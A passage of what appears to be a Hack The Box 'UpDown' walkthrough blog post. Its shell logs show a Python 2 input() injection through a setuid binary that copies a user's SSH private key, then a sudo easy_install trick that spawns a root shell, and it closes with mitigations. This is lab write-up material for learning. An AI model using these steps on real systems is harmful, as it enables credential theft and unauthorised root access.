
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="rouge-code"><pre>www-data@updown:/var/www/dev/uploads/3b8f7dcbcb24fc8e95da41b7b3fc5d0c<span class="nv">$ </span>find / <span class="nt">-perm</span> /u<span class="o">=</span>s 2&gt;/dev/null
&lt;fc8e95da41b7b3fc5d0c<span class="nv">$ </span>find / <span class="nt">-perm</span> /u<span class="o">=</span>s 2&gt;/dev/null                   
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/bin/chsh
/usr/bin/su
/usr/bin/umount
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/fusermount
/usr/bin/at
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/mount
/home/developer/dev/siteisup
</pre></td></tr></tbody></table></code></div></div>

<p>There was an executable in developer’s home that I could run as them.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre></td><td class="rouge-code"><pre>www-data@updown:/home/developer<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /home/developer/dev/siteisup
<span class="nt">-rwsr-x---</span> 1 developer www-data 16928 Jun 22  2022 /home/developer/dev/siteisup

www-data@updown:/home/developer<span class="nv">$ </span>file /home/developer/dev/siteisup
/home/developer/dev/siteisup: setuid ELF 64-bit LSB shared object, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]<span class="o">=</span>b5bbc1de286529f5291b48db8202eefbafc92c1f, <span class="k">for </span>GNU/Linux 3.2.0, not s
tripped
www-data@updown:/home/developer<span class="nv">$ </span>strings /home/developer/dev/siteisup
/lib64/ld-linux-x86-64.so.2
libc.so.6
puts
setresgid
setresuid
system
getegid
geteuid
...
Welcome to <span class="s1">'siteisup.htb'</span> application
/usr/bin/python /home/developer/dev/siteisup_test.py
:<span class="k">*</span>3<span class="s2">$"
GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0
...

-rwxr-x--- 1 developer www-data 154 Jun 22  2022 /home/developer/dev/siteisup_test.py
www-data@updown:/home/developer</span><span class="nv">$ </span><span class="s2">cat /home/developer/dev/siteisup_test.py
import requests

url = input("</span>Enter URL here:<span class="s2">")
page = requests.get(url)
if page.status_code == 200:
        print "</span>Website is up<span class="s2">"
else:
        print "</span>Website is down<span class="s2">"

www-data@updown:/var/www/dev/uploads/3b8f7dcbcb24fc8e95da41b7b3fc5d0c</span><span class="nv">$ </span><span class="s2">python --version
&lt;/3b8f7dcbcb24fc8e95da41b7b3fc5d0c</span><span class="nv">$ </span><span class="s2">python --version                   
Python 2.7.18
</span></pre></td></tr></tbody></table></code></div></div>

<p>The executable seemed to be using a python script to check if a site was up. The script was using <code class="language-plaintext highlighter-rouge">input</code> to get the URL to check. Python 2 has a <a href="https://www.geeksforgeeks.org/vulnerability-input-function-python-2-x/">known vulnerability</a> in input. I used it to copy developer’s ssh key where I could read it.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre></td><td class="rouge-code"><pre>www-data@updown:/home/developer/dev<span class="nv">$ </span>./siteisup                                                                      
Welcome to <span class="s1">'siteisup.htb'</span> application                                                                                
                                                                                                                     
Enter URL here:open<span class="o">(</span><span class="s1">'/tmp/key'</span>, <span class="s1">'w'</span><span class="o">)</span>.write<span class="o">(</span>open<span class="o">(</span><span class="s1">'/home/developer/.ssh/id_rsa'</span><span class="o">)</span>.read<span class="o">())</span>
Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:                                                                                   
  File <span class="s2">"/home/developer/dev/siteisup_test.py"</span>, line 4, <span class="k">in</span> &lt;module&gt;    
    page <span class="o">=</span> requests.get<span class="o">(</span>url<span class="o">)</span>                                                                                         
  File <span class="s2">"/usr/local/lib/python2.7/dist-packages/requests/api.py"</span>, line 75, <span class="k">in </span>get
    <span class="k">return </span>request<span class="o">(</span><span class="s1">'get'</span>, url, <span class="nv">params</span><span class="o">=</span>params, <span class="k">**</span>kwargs<span class="o">)</span>
  File <span class="s2">"/usr/local/lib/python2.7/dist-packages/requests/api.py"</span>, line 61, <span class="k">in </span>request
    <span class="k">return </span>session.request<span class="o">(</span><span class="nv">method</span><span class="o">=</span>method, <span class="nv">url</span><span class="o">=</span>url, <span class="k">**</span>kwargs<span class="o">)</span>
  File <span class="s2">"/usr/local/lib/python2.7/dist-packages/requests/sessions.py"</span>, line 515, <span class="k">in </span>request
    prep <span class="o">=</span> self.prepare_request<span class="o">(</span>req<span class="o">)</span>
  File <span class="s2">"/usr/local/lib/python2.7/dist-packages/requests/sessions.py"</span>, line 453, <span class="k">in </span>prepare_request
    <span class="nv">hooks</span><span class="o">=</span>merge_hooks<span class="o">(</span>request.hooks, self.hooks<span class="o">)</span>,
  File <span class="s2">"/usr/local/lib/python2.7/dist-packages/requests/models.py"</span>, line 318, <span class="k">in </span>prepare
    self.prepare_url<span class="o">(</span>url, params<span class="o">)</span>
  File <span class="s2">"/usr/local/lib/python2.7/dist-packages/requests/models.py"</span>, line 392, <span class="k">in </span>prepare_url
    raise MissingSchema<span class="o">(</span>error<span class="o">)</span>
requests.exceptions.MissingSchema: Invalid URL <span class="s1">'None'</span>: No scheme supplied. Perhaps you meant http://None?
www-data@updown:/home/developer/dev<span class="nv">$ </span><span class="nb">ls</span> /tmp/
error-output.txt  key
www-data@updown:/home/developer/dev<span class="nv">$ </span><span class="nb">cat</span> /tmp/key 
<span class="nt">-----BEGIN</span> OPENSSH PRIVATE KEY-----
...
<span class="nt">-----END</span> OPENSSH PRIVATE KEY-----
www-data@updown:/home/developer/dev<span class="nv">$ </span>
</pre></td></tr></tbody></table></code></div></div>

<p>I copied the key to my machine and used it to reconnect to the server.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>vim dev_id_rsa

<span class="nv">$ </span><span class="nb">chmod </span>600 dev_id_rsa

<span class="nv">$ </span>ssh <span class="nt">-i</span> dev_id_rsa developer@target
Welcome to Ubuntu 20.04.5 LTS <span class="o">(</span>GNU/Linux 5.4.0-122-generic x86_64<span class="o">)</span>

 <span class="k">*</span> Documentation:  https://help.ubuntu.com
 <span class="k">*</span> Management:     https://landscape.canonical.com
 <span class="k">*</span> Support:        https://ubuntu.com/advantage

  System information as of Sat Jan  7 19:21:30 UTC 2023

  System load:           0.0
  Usage of /:            50.0% of 2.84GB
  Memory usage:          14%
  Swap usage:            0%
  Processes:             221
  Users logged <span class="k">in</span>:       0
  IPv4 address <span class="k">for </span>eth0: 10.10.11.177
  IPv6 address <span class="k">for </span>eth0: dead:beef::250:56ff:feb9:241

 <span class="k">*</span> Super-optimized <span class="k">for </span>small spaces - <span class="nb">read </span>how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

8 updates can be applied immediately.
8 of these updates are standard security updates.
To see these additional updates run: apt list <span class="nt">--upgradable</span>


The list of available updates is more than a week old.
To check <span class="k">for </span>new updates run: <span class="nb">sudo </span>apt update

Last login: Tue Aug 30 11:24:44 2022 from 10.10.14.36

developer@updown:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
REDACTED
</pre></td></tr></tbody></table></code></div></div>

<h2 id="getting-root"><span class="mr-2">Getting root</span><a href="#getting-root" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>Escalating to root was very easy. I checked if I could run anything with <code class="language-plaintext highlighter-rouge">sudo</code>.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre></td><td class="rouge-code"><pre>developer@updown:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>developer on localhost:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User developer may run the following commands on localhost:
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/local/bin/easy_install

developer@updown:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /usr/local/bin/easy_install
<span class="nt">-rwxr-xr-x</span> 1 root root 229 Aug  1 18:07 /usr/local/bin/easy_install

developer@updown:~<span class="nv">$ </span>file /usr/local/bin/easy_install
/usr/local/bin/easy_install: Python script, ASCII text executable

developer@updown:~<span class="nv">$ </span><span class="nb">cat</span> /usr/local/bin/easy_install
<span class="c">#!/usr/bin/python</span>
<span class="c"># -*- coding: utf-8 -*-</span>
import re
import sys
from setuptools.command.easy_install import main
<span class="k">if </span>__name__ <span class="o">==</span> <span class="s1">'__main__'</span>:
    sys.argv[0] <span class="o">=</span> re.sub<span class="o">(</span>r<span class="s1">'(-script\.pyw|\.exe)?$'</span>, <span class="s1">''</span>, sys.argv[0]<span class="o">)</span>
    sys.exit<span class="o">(</span>main<span class="o">())</span>
</pre></td></tr></tbody></table></code></div></div>

<p>I searched for exploits in <a href="https://packaging.python.org/en/latest/key_projects/#easy-install">easy_install</a> and found one on <a href="https://gtfobins.github.io/gtfobins/easy_install/">GTFOBins</a> that created a fake local package with code executed on installation.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre>developer@updown:~<span class="nv">$ TF</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span> <span class="nt">-d</span><span class="si">)</span>

developer@updown:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"import os; os.execl('/bin/sh', 'sh', '-c', 'sh &lt;</span><span class="si">$(</span><span class="nb">tty</span><span class="si">)</span><span class="s2"> &gt;</span><span class="si">$(</span><span class="nb">tty</span><span class="si">)</span><span class="s2"> 2&gt;</span><span class="si">$(</span><span class="nb">tty</span><span class="si">)</span><span class="s2">')"</span> <span class="o">&gt;</span> <span class="nv">$TF</span>/setup.py

developer@updown:~<span class="nv">$ </span><span class="nb">sudo</span> /usr/local/bin/easy_install <span class="nv">$TF</span>
WARNING: The easy_install <span class="nb">command </span>is deprecated and will be removed <span class="k">in </span>a future version.
Processing tmp.YeeqjgELbW
Writing /tmp/tmp.YeeqjgELbW/setup.cfg
Running setup.py <span class="nt">-q</span> bdist_egg <span class="nt">--dist-dir</span> /tmp/tmp.YeeqjgELbW/egg-dist-tmp-7F9vet

<span class="c"># whoami</span>
root

<span class="c"># cat /root/root.txt</span>
REDACTED
</pre></td></tr></tbody></table></code></div></div>

<h2 id="mitigations"><span class="mr-2">Mitigations</span><a href="#mitigations" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>I found the initial foothold on that box very hard. There were some security measures in place to make it harder to pwn. But it still had some issues that could be easily fixed.</p>

<p>The <code class="language-plaintext highlighter-rouge">.git</code> folder should never be deployed with a site. Having access to the source code helped me find things I could exploit.</p>

<p>The file upload functionality had a few issues.</p>
<ul>
  <li>The upload folder should not allow directory listing</li>
  <li>Uploaded files should be renamed</li>
  <li>The upload folder should have been outside the webroot</li>
  <li>The list of extensions should have been an allowed list instead of a denied list</li>
</ul>

<p>The disabled functions were great. This is what gave me a really hard time on that box. But it took only one missing function to allow access to the box. It shows that file upload is a very dangerous feature.</p>

<p>The issue with the Python script can be fixed by using <code class="language-plaintext highlighter-rouge">raw_input</code> instead of <code class="language-plaintext highlighter-rouge">input</code>. And the executable should probably not have the <code class="language-plaintext highlighter-rouge">suid</code> bit set.</p>

<p>As for <code class="language-plaintext highlighter-rouge">easy_install</code>, it is deprecated. So it should probably not be used. And it should not be run as root. Developers should install their dependencies as themselves.</p>

</div>

<div class="post-tail-wrapper text-muted">

  <!-- categories -->
  

  <!-- tags -->
  
  <div class="post-tags">
    <i class="fa fa-tags fa-fw mr-1"></i>
      
      <a href="/tags/walkthrough/"
          class="post-tag no-text-decoration" >Walkthrough</a>
      
      <a href="/tags/hacking/"
          class="post-tag no-text-decoration" >Hacking</a>
      
      <a href="/tags/hackthebox/"
          class="post-tag no-text-decoration" >HackTheBox</a>
      
      <a href="/tags/medium/"
          class="post-tag no-text-decoration" >Medium</a>
      
      <a href="/tags/machine/"
          class="post-tag no-text-decoration" >Machine</a>
      
  </div>
  

  <div class="post-tail-bottom
    d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
    <div class="license-wrapper">

      

        

        This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.

      
    </div>

    <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons">
    
    
    

    
      
        <a href="https://twitter.com/intent/tweet?text=Hack+The+Box+-+UpDown+-+Ankit+Kanojiya&url=http%3A%2F%2Flocalhost%3A4000%2F2023%2F01%2FHTB%2FUpDown" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?title=Hack+The+Box+-+UpDown+-+Ankit+Kanojiya&u=http%3A%2F%2Flocalhost%3A4000%2F2023%2F01%2FHTB%2FUpDown" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2F2023%2F01%2FHTB%2FUpDown&text=Hack+The+Box+-+UpDown+-+Ankit+Kanojiya" data-toggle="tooltip" data-placement="top"
          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
          <i class="fa-fw fab fa-telegram"></i>
        </a>
    

    <i id="copy-link" class="fa-fw fas fa-link small"
        data-toggle="tooltip" data-placement="top"
        title="Copy link"
        data-title-succeed="Link copied successfully!">
    </i>

  </span>
</div>


  </div><!-- .post-tail-bottom -->

</div><!-- div.post-tail-wrapper -->

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="ankitkanojiya" data-description="Support me on Buy me a coffee!" data-message="" data-color="#BD5FFF" data-position="Right" data-x_margin="18" data-y_margin="18"></script>

      
    
    

    </div>
  </div> <!-- #core-wrapper -->

  <!-- panel -->
  <div id="panel-wrapper" class="col-xl-3 pl-2 text-muted">

    <div class="access">
      















      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/hacking/">Hacking</a>
    
      
      <a class="post-tag" href="/tags/hackthebox/">HackTheBox</a>
    
      
      <a class="post-tag" href="/tags/machine/">Machine</a>
    
      
      <a class="post-tag" href="/tags/walkthrough/">Walkthrough</a>
    
      
      <a class="post-tag" href="/tags/medium/">Medium</a>
    
      
      <a class="post-tag" href="/tags/linux/">linux</a>
    
      
      <a class="post-tag" href="/tags/cve/">cve</a>
    
      
      <a class="post-tag" href="/tags/easy/">Easy</a>
    
      
      <a class="post-tag" href="/tags/c/">c</a>
    
      
      <a class="post-tag" href="/tags/chroot/">chroot</a>
    

    </div>
  </div>


    </div>

    
      
      



<!-- BS-toc.js will be loaded at medium priority -->
<script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>

<div id="toc-wrapper" class="pl-0 pr-4 mb-5">
  <div class="panel-heading pl-3 pt-2 mb-2">Contents</div>
  <nav id="toc" data-toggle="toc"></nav>
</div>


    
  </div>

</div>

<!-- tail -->

<div class="row">
  <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4 mt-5">
    
      
      <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  
    
  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  








<!-- Fill with the other newlest posts  -->





  <div id="related-posts" class="mb-2 mb-sm-4">
    <h3 class="pt-2 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/posts/HackTheBox-Walkthrough-Health/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1673020800"
    data-df="ll"
    >
  Jan  7, 2023
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Health</h3>
            <div class="text-muted small">
              <p>
                





                This was a difficult, but fun machine. It came out as an easy machine before being reclassified as medium. It took me a long time before I finally pwned it.

It started with using a web application...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/HackTheBox-Walkthrough-Ambassador/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1674835200"
    data-df="ll"
    >
  Jan 28, 2023
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Ambassador</h3>
            <div class="text-muted small">
              <p>
                





                This was a really fun box where I had to use multiple vulnerabilities. There was a Local File Inclusion (LFI), credentials stored in clear, misconfiguration, and a Git repository with a token in it...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/HackTheBox-Walkthrough-Awkward/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1677254400"
    data-df="ll"
    >
  Feb 25, 2023
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box Walkthrough - Awkward</h3>
            <div class="text-muted small">
              <p>
                





                This was a difficult box for me. I had to exploit a web application to get Remote Code Execution, find the user’s password in an notes file, then exploit the same application a second time to get r...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
  </div> <!-- #related-posts -->


    
      
      <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <a href="/posts/HackTheBox-Walkthrough-Shoppy/" class="btn btn-outline-primary"
    prompt="Older">
    <p>Hack The Box - Shoppy</p>
  </a>
  

  
  <a href="/posts/HackTheBox-Walkthrough-Ambassador/" class="btn btn-outline-primary"
    prompt="Newer">
    <p>Hack The Box - Ambassador</p>
  </a>
  

</div>

    
      
      <!--  The comments switcher -->


    
  </div>
</div>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/hacking/">Hacking</a>
    
      
      <a class="post-tag" href="/tags/hackthebox/">HackTheBox</a>
    
      
      <a class="post-tag" href="/tags/machine/">Machine</a>
    
      
      <a class="post-tag" href="/tags/walkthrough/">Walkthrough</a>
    
      
      <a class="post-tag" href="/tags/medium/">Medium</a>
    
      
      <a class="post-tag" href="/tags/linux/">linux</a>
    
      
      <a class="post-tag" href="/tags/cve/">cve</a>
    
      
      <a class="post-tag" href="/tags/easy/">Easy</a>
    
      
      <a class="post-tag" href="/tags/c/">c</a>
    
      
      <a class="post-tag" href="/tags/chroot/">chroot</a>
    

    </div>
  </div>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    <!-- The Footer -->

<footer>
  <div class="container pl-lg-4 pr-lg-4">
    <div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3">
      <div class="footer-left">
        <p class="mb-0">
          © 2023
          <a href="https://twitter.com/AnkitKanojiya69">Ankit Kanojiya</a>.
          
          <span data-toggle="tooltip" data-placement="top"
            title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span>
          
        </p>
      </div>

      <div class="footer-right">
        <p class="mb-0">

          

          

          Powered by 
          <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>
           with 
          <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>
           theme.
        </p>
      </div>
    </div>
  </div>
  <div class="mt-auto d-flex flex-wrap justify-content-center align-items-center">
    <script src="https://www.hackthebox.eu/badge/1256978"></script>
    <script src="https://tryhackme.com/badge/50213"></script>
  </div>
</footer>


    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    
      <div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true"
        data-animation="true" data-autohide="false">
        <div class="toast-header">
          <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close">
            <span aria-hidden="true">&times;</span>
          </button>
        </div>
        <div class="toast-body text-center pt-0">
          <p class="pl-2 pr-2 mb-3">A new version of content is available.</p>
          <button type="button" class="btn btn-primary" aria-label="Update">
            Update
          </button>
        </div>
      </div>
    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No results found.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
